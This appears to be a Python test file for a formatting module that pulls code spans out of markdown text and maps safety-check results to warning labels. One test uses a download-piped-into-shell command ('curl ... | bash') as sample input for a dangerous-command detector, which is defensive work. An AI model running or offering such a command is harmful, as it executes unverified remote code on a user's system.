from api.formatting import code_spans, for_safety, warning_labels


def test_code_spans_from_fenced_and_inline_code() -> None:
    """Code spans from fenced and inline code."""
    text = (
        "Run `kubectl get pods` first.\n```bash\ncurl -fsSL https://x.sh | bash\n```\nthen *check*."
    )
    assert code_spans(text) == ["curl -fsSL https://x.sh | bash", "kubectl get pods"]
    assert for_safety(text)[0] == {"kind": "code", "content": "curl -fsSL https://x.sh | bash"}


def test_only_code_labels_become_post_warnings() -> None:
    """Only code labels become post warnings."""
    warnings = [
        {"check": "dangerous_command", "kind": "download piped into a shell"},
        {"check": "dangerous_command", "kind": "download piped into a shell"},
        {"check": "pii", "kind": "PERSON"},
        {"check": "package", "kind": "PyPI package 'x' not found"},
    ]
    assert warning_labels(warnings) == ["download piped into a shell", "PyPI package 'x' not found"]
